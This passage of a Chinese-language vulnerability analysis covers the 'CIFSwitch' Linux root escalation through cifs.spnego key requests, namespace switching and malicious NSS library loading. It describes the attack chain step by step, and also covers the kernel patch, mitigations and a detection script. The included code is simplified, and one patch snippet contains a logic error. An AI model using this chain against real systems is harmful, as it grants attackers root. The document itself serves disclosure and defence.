│  │  执行 /usr/sbin/cifs.upcall                         │    │
│  └────────────────────────────────────────────────────┘    │
│                          ↓                                  │
│  T4: cifs.upcall 以 root 权限启动                           │
│  ┌────────────────────────────────────────────────────┐    │
│  │  解析密钥描述：                                      │    │
│  │  - ver=0x2                                          │    │
│  │  - host=attacker.com                                │    │
│  │  - pid=1234 ⚠️                                      │    │
│  │  - upcall_target=app ⚠️                             │    │
│  └────────────────────────────────────────────────────┘    │
│                          ↓                                  │
│  T5: 命名空间切换                                            │
│  ┌────────────────────────────────────────────────────┐    │
│  │  根据 upcall_target=app：                           │    │
│  │  1. 查找 PID 1234 的进程                            │    │
│  │  2. 切换到该进程的 user namespace                   │    │
│  │  3. 切换到该进程的 mount namespace                  │    │
│  │  ⚠️ 现在处于攻击者的命名空间中                      │    │
│  └────────────────────────────────────────────────────┘    │
│                          ↓                                  │
│  T6: NSS 查找                                                │
│  ┌────────────────────────────────────────────────────┐    │
│  │  在攻击者的命名空间中：                              │    │
│  │  1. 读取 /etc/nsswitch.conf (攻击者伪造的)          │    │
│  │  2. 调用 getpwuid() 等函数                          │    │
│  │  3. 加载 libnss_evil.so.2 (攻击者的恶意库)          │    │
│  └────────────────────────────────────────────────────┘    │
│                          ↓                                  │
│  T7: 恶意代码执行                                            │
│  ┌────────────────────────────────────────────────────┐    │
│  │  libnss_evil.so.2 以 root 权限执行：                │    │
│  │  - 修改 /etc/sudoers                                │    │
│  │  - 创建 SUID 后门                                   │    │
│  │  - 添加 root 用户                                   │    │
│  │  - 执行任意命令                                     │    │
│  └────────────────────────────────────────────────────┘    │
│                          ↓                                  │
│  T8: 权限提升完成                                            │
│  ┌────────────────────────────────────────────────────┐    │
│  │  攻击者现在拥有 root 权限                            │    │
│  │  - sudo 无密码执行                                  │    │
│  │  - 或通过 SUID 后门提权                             │    │
│  └────────────────────────────────────────────────────┘    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 4.4 攻击成功的关键点

#### 4.4.1 关键点总结

| 序号 | 关键点 | 原因 |
|------|--------|------|
| 1 | 缺少 vet_description | 内核无法验证密钥描述来源 |
| 2 | 攻击者可调用 request_key | 非特权用户可以请求任意类型的密钥 |
| 3 | cifs.upcall 以 root 运行 | request-key 配置指定以 root 执行 |
| 4 | upcall_target=app | 触发命名空间切换逻辑 |
| 5 | pid 字段可控 | 攻击者指定自己的进程 PID |
| 6 | 命名空间切换 | root 进程进入攻击者的命名空间 |
| 7 | NSS 查找时机 | 在权限完全降级前执行 NSS 查找 |
| 8 | NSS 模块加载 | 加载攻击者命名空间中的恶意库 |
| 9 | root 权限执行 | 恶意库以 root 权限运行 |

#### 4.4.2 时序图

```
攻击者进程          内核            cifs.upcall (root)
    │                 │                    │
    │ request_key()   │                    │
    │────────────────>│                    │
    │                 │                    │
    │                 │ fork + exec        │
    │                 │───────────────────>│
    │                 │                    │
    │                 │                    │ 解析 description
    │                 │                    │ ├─> pid=1234
    │                 │                    │ └─> upcall_target=app
    │                 │                    │
    │                 │                    │ setns(pid=1234)
    │                 │                    │ ├─> 切换 user NS
    │                 │                    │ └─> 切换 mount NS
    │                 │                    │
    │                 │                    │ getpwuid() ⚠️
    │                 │                    │ ├─> 读取 nsswitch.conf
    │                 │                    │ └─> 加载 libnss_evil.so.2
    │                 │                    │
    │                 │                    │ 执行恶意代码 (root) ⚠️
    │                 │                    │ ├─> 修改 /etc/sudoers
    │                 │                    │ └─> 创建 SUID 后门
    │                 │                    │
    │                 │<───────────────────│
    │<────────────────│                    │
    │                 │                    │
    │ 检查提权结果    │                    │
    │ ├─> sudo -l     │                    │
    │ └─> 成功！      │                    │
    │                 │                    │
```

---

## 5. 内核代码详细分析

### 5.1 密钥类型注册

#### 5.1.1 cifs_spnego_key_type 定义

**`fs/cifs/cifs_spnego.c`**：

```c
struct key_type cifs_spnego_key_type = {
    .name           = "cifs.spnego",
    .instantiate    = cifs_spnego_key_instantiate,
    .destroy        = cifs_spnego_key_destroy,
    .describe       = user_describe,
    // ⚠️ 缺少 .vet_description 钩子！
};
```

#### 5.1.2 密钥类型注册

**`fs/cifs/cifs_spnego.c`**：

```c
int init_cifs_spnego(void)
{
    // ...
    ret = register_key_type(&cifs_spnego_key_type);
    if (ret < 0)
        goto failed_put_key;
    // ...
}
```

### 5.2 request_key 流程

#### 5.2.1 request_key 系统调用

**`security/keys/request_key.c`**：

```c
// 系统调用入口
SYSCALL_DEFINE4(request_key, const char __user *, _type,
                const char __user *, _description,
                const char __user *, _callout_info,
                key_serial_t, dest_keyring)
{
    // 复制用户空间参数
    type = strncpy_from_user(type, _type, PAGE_SIZE);
    description = strncpy_from_user(description, _description, PAGE_SIZE);

    // ⚠️ 关键：没有验证 description 的来源！

    // 调用核心函数
    key = request_key_thread(key_type, description, callout_info,
                             dest_keyring, NULL);
    // ...
}
```

#### 5.2.2 密钥查找和创建

```c
struct key *request_key_thread(struct key_type *type,
                               const char *description,
                               const void *callout_info,
                               key_serial_t dest_keyring_id,
                               void *aux)
{
    // 1. 尝试在密钥环中查找现有密钥
    key = search_process_keyrings(type, description, type->match, cred);
    if (!IS_ERR(key))
        return key;  // 找到了，直接返回

    // 2. 未找到，需要创建新密钥
    // ⚠️ 这里会触发 upcall

    // 3. 调用用户空间辅助程序
    ret = construct_key(key, callout_info, aux, dest_keyring);
    // ...
}
```

#### 5.2.3 调用用户空间辅助程序

**`security/keys/request_key.c`**：

```c
static int call_sbin_request_key(struct key *authkey, void *aux)
{
    // 构造参数
    argv[0] = "/sbin/request-key";
    argv[1] = rka->op;              // 操作类型
    argv[2] = key_str;              // 密钥序列号
    argv[3] = uid_str;              // 用户 ID
    argv[4] = gid_str;              // 组 ID
    // ...

    // 以 root 权限执行
    ret = call_usermodehelper_keys(request_key, argv, envp, keyring,
                                   UMH_WAIT_PROC);
    // ...
}
```

### 5.3 cifs.upcall 处理流程

#### 5.3.1 request-key 配置

`/etc/request-key.d/cifs.spnego.conf`：
```
create  cifs.spnego    *          *    /usr/sbin/cifs.upcall %k
```

这表示当请求 `cifs.spnego` 类型密钥时，执行 `/usr/sbin/cifs.upcall`。

#### 5.3.2 cifs.upcall 关键逻辑

```c
// cifs.upcall 的处理流程（简化）
int main(int argc, char *argv[])
{
    // 1. 从内核获取密钥描述
    char *description = get_key_description_from_kernel();

    // 2. 解析描述字段
    parse_key_description(description,
                          &ver, &host, &ip, &sec,
                          &uid, &creduid, &user, &pid,
                          &upcall_target);  // ⚠️ 攻击者可控

    // 3. 如果 upcall_target == "app"，切换命名空间
    if (strcmp(upcall_target, "app") == 0) {
        // 根据 pid 查找目标进程
        target_ns = get_process_namespace(pid);  // ⚠️ 攻击者的进程

        // 切换到目标命名空间
        setns(target_ns, CLONE_NEWUSER);
        setns(target_ns, CLONE_NEWNS);
        // ⚠️ 现在处于攻击者的命名空间中！
    }

    // 4. 获取 Kerberos 票据
    // 在获取票据前，可能需要调用 NSS 查找用户信息
    struct passwd *pwd = getpwuid(uid);  // ⚠️ 触发 NSS 查找

    // 5. 获取票据并返回给内核
    krb5_ccache ccache = get_kerberos_ticket(host, user);
    return_spnego_blob_to_kernel(ccache);

    return 0;
}
```

### 5.4 修复补丁分析

#### 5.4.1 内核补丁

补丁 commit: `3da1fdf4efbc490041eb4f836bf596201203f8f2`

**修复方法**：添加 `vet_description` 钩子，验证密钥描述是否来自内核 CIFS 模块。

```c
// 修复后的代码
static int cifs_spnego_vet_description(const char *description)
{
    // 验证描述是否由内核 CIFS 生成
    // 检查是否使用了特殊的 spnego_cred 凭证
    if (!current->cred == spnego_cred) {
        return -EPERM;  // 拒绝非内核来源的请求
    }
    return 0;
}

struct key_type cifs_spnego_key_type = {
    .name           = "cifs.spnego",
    .vet_description = cifs_spnego_vet_description,  // ✓ 添加验证钩子
    .instantiate    = cifs_spnego_key_instantiate,
    .destroy        = cifs_spnego_key_destroy,
    .describe       = user_describe,
};
```

**验证逻辑**：
```c
// 内核使用特殊的凭证来请求 cifs.spnego 密钥
saved_cred = override_creds(spnego_cred);  // 切换到特殊凭证
spnego_key = request_key(&cifs_spnego_key_type, description, "");
revert_creds(saved_cred);  // 恢复原凭证

// vet_description 钩子检查当前进程是否使用了 spnego_cred
static int cifs_spnego_vet_description(const char *description)
{
    // 只有使用 spnego_cred 的请求才能通过验证
    if (current->cred != spnego_cred)
        return -EPERM;
    return 0;
}
```

---

## 6. 修复方案和缓解措施

### 6.1 官方修复方案

#### 6.1.1 内核更新

**上游补丁**：
- Commit: `3da1fdf4efbc490041eb4f836bf596201203f8f2`
- 链接：https://github.com/torvalds/linux/commit/3da1fdf4efbc490041eb4f836bf596201203f8f2

**各发行版更新**：
- 关注各发行版的安全公告
- 升级到包含补丁的内核版本
- 重启系统以应用更新

#### 6.1.2 cifs-utils 更新

更新 cifs-utils 到修复版本，加强对密钥描述的验证。

### 6.2 缓解措施

#### 6.2.1 卸载 cifs-utils（推荐）

如果系统不需要 CIFS/SMB 功能：

```bash
# Debian/Ubuntu
sudo apt remove cifs-utils

# RHEL/CentOS/Fedora/Rocky/Alma
sudo dnf remove cifs-utils

# SUSE
sudo zypper remove cifs-utils
```

#### 6.2.2 禁用 CIFS 内核模块

```bash
# 黑名单方式
echo "blacklist cifs" | sudo tee /etc/modprobe.d/blacklist-cifs.conf

# 卸载已加载的模块
sudo modprobe -r cifs

# 更新 initramfs
sudo update-initramfs -u  # Debian/Ubuntu
sudo dracut -f            # RHEL/CentOS
```

#### 6.2.3 覆盖 cifs.spnego request-key 规则

创建空规则，阻止 cifs.spnego 请求：

```bash
# 创建空规则文件
sudo tee /etc/request-key.d/cifs.spnego.conf <<EOF
# Disabled due to QVD-2026-29453
# create  cifs.spnego    *          *    /usr/sbin/cifs.upcall %k
EOF

# 或者指向一个不存在的程序
sudo tee /etc/request-key.d/cifs.spnego.conf <<EOF
create  cifs.spnego    *          *    /bin/false
EOF
```

#### 6.2.4 禁用非特权用户命名空间

```bash
# 方法 1：sysctl
sudo sysctl -w kernel.unprivileged_userns_clone=0

# 永久生效
echo "kernel.unprivileged_userns_clone=0" | sudo tee -a /etc/sysctl.conf

# 方法 2：AppArmor (Ubuntu/Debian/SUSE)
sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=1

# 永久生效
echo "kernel.apparmor_restrict_unprivileged_userns=1" | sudo tee -a /etc/sysctl.conf
```

**注意**：禁用用户命名空间可能影响容器应用（Docker、Podman 等）。

#### 6.2.5 启用 SELinux/AppArmor

确保 SELinux 或 AppArmor 处于 Enforcing 模式：

```bash
# SELinux (RHEL/CentOS/Fedora/Rocky/Alma)
sudo setenforce 1
# 永久生效：编辑 /etc/selinux/config
SELINUX=enforcing

# AppArmor (Ubuntu/Debian/SUSE)
sudo aa-enforce /etc/apparmor.d/*
```

### 6.3 检测方法

#### 6.3.1 检查系统是否受影响

```bash
#!/bin/bash
# 检查脚本

echo "=== CIFSwitch 漏洞检测 ==="

# 1. 检查内核版本
echo -e "\n[1] 内核版本："
uname -r

# 2. 检查 cifs-utils 是否安装
echo -e "\n[2] cifs-utils 状态："
if command -v dpkg &> /dev/null; then
    dpkg -l | grep cifs-utils || echo "未安装"
elif command -v rpm &> /dev/null; then
    rpm -qa | grep cifs-utils || echo "未安装"
fi

# 3. 检查 CIFS 模块
echo -e "\n[3] CIFS 模块状态："
lsmod | grep cifs || echo "未加载"

# 4. 检查 request-key 配置
echo -e "\n[4] cifs.spnego request-key 配置："
cat /etc/request-key.d/cifs.spnego.conf 2>/dev/null || echo "不存在"

# 5. 检查用户命名空间
echo -e "\n[5] 用户命名空间设置："
sysctl kernel.unprivileged_userns_clone 2>/dev/null || echo "不支持该参数"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null || echo "不支持该参数"

# 6. 检查 SELinux/AppArmor
echo -e "\n[6] LSM 状态："
if command -v getenforce &> /dev/null; then
    echo "SELinux: $(getenforce)"
elif command -v aa-status &> /dev/null; then
    echo "AppArmor: $(aa-status --enabled && echo 'enabled' || echo 'disabled')"
else
    echo "未检测到 SELinux 或 AppArmor"
fi

echo -e "\n=== 检测完成 ==="
```

#### 6.3.2 检查是否已修复

```bash
# 检查内核补丁是否已应用
# 方法 1：查看内核源码（如果有）
grep -r "vet_description" fs/cifs/cifs_spnego.c

# 方法 2：检查内核配置
zcat /proc/config.gz | grep CONFIG_CIFS

# 方法 3：尝试触发漏洞（需要测试环境）
# ⚠️ 仅在测试环境中执行
# 如果 request_key 失败并返回 EPERM，说明已修复
```

---

## 7. 总结

### 7.1 漏洞特点

1. **历史悠久**：自 2007 年引入，潜伏 19 年
2. **影响广泛**：影响几乎所有主流 Linux 发行版
3. **利用简单**：不需要复杂的内存操作，纯逻辑漏洞
4. **权限提升彻底**：可直接获得 root 权限
5. **PoC 已公开**：攻击代码已公开，风险极高
6. **Non-Universal 特性**：不是所有系统都受影响，取决于多个条件同时满足
7. **攻击链阴险**：不是恶意程序作恶，而是诱导善意程序滥用信任关系

### 7.2 漏洞的独特性分析

#### 7.2.1 与传统漏洞的对比

| 特性 | 传统漏洞 | CIFSwitch |
|------|---------|-----------|
| **攻击方式** | 直接注入恶意代码 | 诱导善意程序滥用信任 |
| **恶意代码** | 明显的 shellcode/ROP | 无明显恶意代码 |
| **信任关系** | 绕过或破坏 | 滥用合法的信任链 |
| **组件性质** | 恶意组件 | 所有组件都是合法的 |
| **隐蔽性** | 较低（特征明显） | 极高（逻辑漏洞） |
| **防御难度** | 较易（特征检测） | 较难（需理解逻辑） |

#### 7.2.2 Non-Universal 的影响

**正面影响**：
- 不是所有系统都受影响，降低了全球影响范围
- 许多现代发行版默认启用 SELinux/AppArmor，自动阻断攻击
- 给了管理员更多的缓解选择

**负面影响**：
- 增加了评估难度：需要逐个检查系统配置
- 可能导致误判：认为"我的系统不受影响"而忽视修复
- PoC 公开后，攻击者可以针对特定配置优化攻击

#### 7.2.3 为什么传统审计方法失效

1. **代码看起来完全正常**
   ```c
   struct key_type cifs_spnego_key_type = {
       .name           = "cifs.spnego",
       .instantiate    = cifs_spnego_key_instantiate,
       .destroy        = cifs_spnego_key_destroy,
       .describe       = user_describe,
       // ⚠️ 缺少 vet_description，但语法完全正确
   };
   ```
   - 没有明显的编程错误
   - 没有内存安全问题
   - 代码风格符合规范

2. **需要跨组件理解**
   - 必须理解密钥环子系统的工作原理
   - 必须理解 request_key 的信任模型
   - 必须理解命名空间的安全含义
   - 必须理解 NSS 的加载机制
   - 必须将这些组件的交互作为一个整体分析

3. **需要"攻击者思维"**
   - 正常思维：如何让功能正常工作
   - 攻击者思维：如何滥用看似正常的逻辑
   - 传统审计往往缺乏这种"反向思考"

### 7.3 漏洞启示

1. **信任验证的重要性**：内核必须验证来自用户空间的数据来源
2. **命名空间安全的复杂性**：命名空间在提供隔离的同时，也可能被滥用
3. **代码审计的盲区**：某些代码路径可能长期未被审计
4. **AI 辅助漏洞发现**：该漏洞通过 AI 辅助的语义图分析发现

### 7.3 参考资料

1. 漏洞披露：https://seclists.org/oss-sec/2026/q2/717
2. 技术分析：https://heyitsas.im/posts/cifswitch/
3. PoC 代码：https://github.com/manizada/CIFSwitch
4. 内核补丁：https://github.com/torvalds/linux/commit/3da1fdf4efbc490041eb4f836bf596201203f8f2
5. 奇安信通告：https://www.cnetsec.com/article/43657.html

---

## 附录 A：相关内核代码路径

### A.1 CIFS 子系统

```
fs/cifs/
├── cifs_spnego.c      # SPNEGO 密钥处理 ⚠️ 漏洞核心
├── cifs_spnego.h      # SPNEGO 头文件
├── cifsfs.c           # CIFS 文件系统主文件
├── connect.c          # 连接管理
├── sess.c             # 会话管理
└── ...
```

### A.2 密钥环子系统

```
security/keys/
├── key.c              # 密钥核心功能
├── keyctl.c           # 密钥控制系统调用
├── request_key.c      # request_key 实现 ⚠️ 触发 upcall
├── request_key_auth.c # request_key 授权
└── ...
```

### A.3 命名空间子系统

```
kernel/
├── user_namespace.c   # 用户命名空间 ⚠️ 被利用
├── nsproxy.c          # 命名空间代理
└── ...

fs/
└── namespace.c        # 挂载命名空间 ⚠️ 被利用
```

---

## 附录 B：名词解释

- **CIFS**：Common Internet File System，通用互联网文件系统
- **SMB**：Server Message Block，服务器消息块协议
- **SPNEGO**：Simple and Protected GSS-API Negotiation Mechanism
- **Kerberos**：网络认证协议
- **NSS**：Name Service Switch，名字服务切换
- **Keyring**：Linux 密钥环机制
- **User Namespace**：用户命名空间，隔离用户和组 ID
- **Mount Namespace**：挂载命名空间，隔离文件系统视图
- **LPE**：Local Privilege Escalation，本地权限提升
- **PoC**：Proof of Concept，概念验证代码
